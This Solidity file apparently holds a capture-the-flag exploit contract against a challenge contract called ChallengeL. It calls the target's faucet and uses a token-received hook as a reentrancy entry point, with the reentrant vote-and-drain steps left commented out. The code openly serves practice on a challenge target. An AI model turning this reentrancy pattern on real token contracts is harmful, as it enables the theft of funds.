// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./ChallengeL.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ExploitChallenge {
    address govToken;
    ChallengeL challenge;
    bool public faucetUsed;

    constructor(address exploitable) payable {
        challenge = ChallengeL(exploitable);
        govToken = challenge.govTokens(0);
        //challenge.faucet();
    }

    function finalize() external {
        challenge.faucet();
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        faucetUsed = true;

        // uint256 balance = IERC20(govToken).balanceOf(address(challenge));
        // if (balance > 0) {
        //     challenge.addProposal(10 ether);
        //     challenge.voteProposal(balance, !challenge.faucetUsed());
        //     challenge.faucet();
        // }
    }

    receive() external payable {}
}
